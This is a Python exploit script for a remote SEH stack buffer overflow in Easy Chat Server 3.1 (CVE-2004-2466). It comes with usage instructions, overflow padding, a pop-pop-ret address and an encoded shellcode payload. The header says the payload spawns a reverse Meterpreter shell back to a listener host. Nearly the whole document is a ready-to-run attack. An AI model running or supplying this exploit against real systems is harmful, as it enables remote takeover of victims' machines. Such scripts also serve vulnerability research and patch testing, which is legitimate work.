# Exploit Title: Easy Chat Server 3.1 - Remote Stack Buffer Overflow (SEH)
# Exploit Author: r00tpgp @ http://www.r00tpgp.com
# Usage: python easychat-exploit.py <victim-ip> <port>
# Spawns reverse meterpreter LHOST=192.168.0.162 LPORT=1990
# CVE: CVE-2004-2466 
# Installer: http://www.echatserver.com/
# Tested on: Microsoft Windows 11 Pro x86-64 (10.0.22000 N/A Build 22000)

#!/usr/bin/python3

import sys
import socket
from struct import pack

host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user

junk = b"A" * 217
nseh = pack("<L", 0x06eb9090)   # short jump 6 bytes
seh  = pack("<L", 0x10018541)   # pop ebx ; pop edi ; ret ssleay32.dll

shellcode = b"\x90" * 16
shellcode += b"\xdb\xdd\xbd\x8b\x1b\xc8\xa3\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x52\x31\x6a\x17\x83\xea\xfc"
shellcode += b"\x03\xe1\x08\x2a\x56\x09\xc6\x28\x99\xf1\x17"
shellcode += b"\x4d\x13\x14\x26\x4d\x47\x5d\x19\x7d\x03\x33"
shellcode += b"\x96\xf6\x41\xa7\x2d\x7a\x4e\xc8\x86\x31\xa8"
shellcode += b"\xe7\x17\x69\x88\x66\x94\x70\xdd\x48\xa5\xba"
shellcode += b"\x10\x89\xe2\xa7\xd9\xdb\xbb\xac\x4c\xcb\xc8"
shellcode += b"\xf9\x4c\x60\x82\xec\xd4\x95\x53\x0e\xf4\x08"
shellcode += b"\xef\x49\xd6\xab\x3c\xe2\x5f\xb3\x21\xcf\x16"
shellcode += b"\x48\x91\xbb\xa8\x98\xeb\x44\x06\xe5\xc3\xb6"
shellcode += b"\x56\x22\xe3\x28\x2d\x5a\x17\xd4\x36\x99\x65"
shellcode += b"\x02\xb2\x39\xcd\xc1\x64\xe5\xef\x06\xf2\x6e"
shellcode += b"\xe3\xe3\x70\x28\xe0\xf2\x55\x43\x1c\x7e\x58"
shellcode += b"\x83\x94\xc4\x7f\x07\xfc\x9f\x1e\x1e\x58\x71"
shellcode += b"\x1e\x40\x03\x2e\xba\x0b\xae\x3b\xb7\x56\xa7"
shellcode += b"\x88\xfa\x68\x37\x87\x8d\x1b\x05\x08\x26\xb3"
shellcode += b"\x25\xc1\xe0\x44\x49\xf8\x55\xda\xb4\x03\xa6"
shellcode += b"\xf3\x72\x57\xf6\x6b\x52\xd8\x9d\x6b\x5b\x0d"
shellcode += b"\x31\x3b\xf3\xfe\xf2\xeb\xb3\xae\x9a\xe1\x3b"
shellcode += b"\x90\xbb\x0a\x96\xb9\x56\xf1\x71\x06\x0e\xf8"
shellcode += b"\xef\xee\x4d\xfa\xfe\xb5\xd8\x1c\x6a\x5a\x8d"
shellcode += b"\xb7\x03\xc3\x94\x43\xb5\x0c\x03\x2e\xf5\x87"
shellcode += b"\xa0\xcf\xb8\x6f\xcc\xc3\x2d\x80\x9b\xb9\xf8"
shellcode += b"\x9f\x31\xd5\x67\x0d\xde\x25\xe1\x2e\x49\x72"
shellcode += b"\xa6\x81\x80\x16\x5a\xbb\x3a\x04\xa7\x5d\x04"
shellcode += b"\x8c\x7c\x9e\x8b\x0d\xf0\x9a\xaf\x1d\xcc\x23"
shellcode += b"\xf4\x49\x80\x75\xa2\x27\x66\x2c\x04\x91\x30"
shellcode += b"\x83\xce\x75\xc4\xef\xd0\x03\xc9\x25\xa7\xeb"
shellcode += b"\x78\x90\xfe\x14\xb4\x74\xf7\x6d\xa8\xe4\xf8"
shellcode += b"\xa4\x68\x14\xb3\xe4\xd9\xbd\x1a\x7d\x58\xa0"
shellcode += b"\x9c\xa8\x9f\xdd\x1e\x58\x60\x1a\x3e\x29\x65"
shellcode += b"\x66\xf8\xc2\x17\xf7\x6d\xe4\x84\xf8\xa7"

buffer = b"GET /chat.ghp?username=" + junk + nseh + seh + shellcode + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.1.136:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.1.136\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")
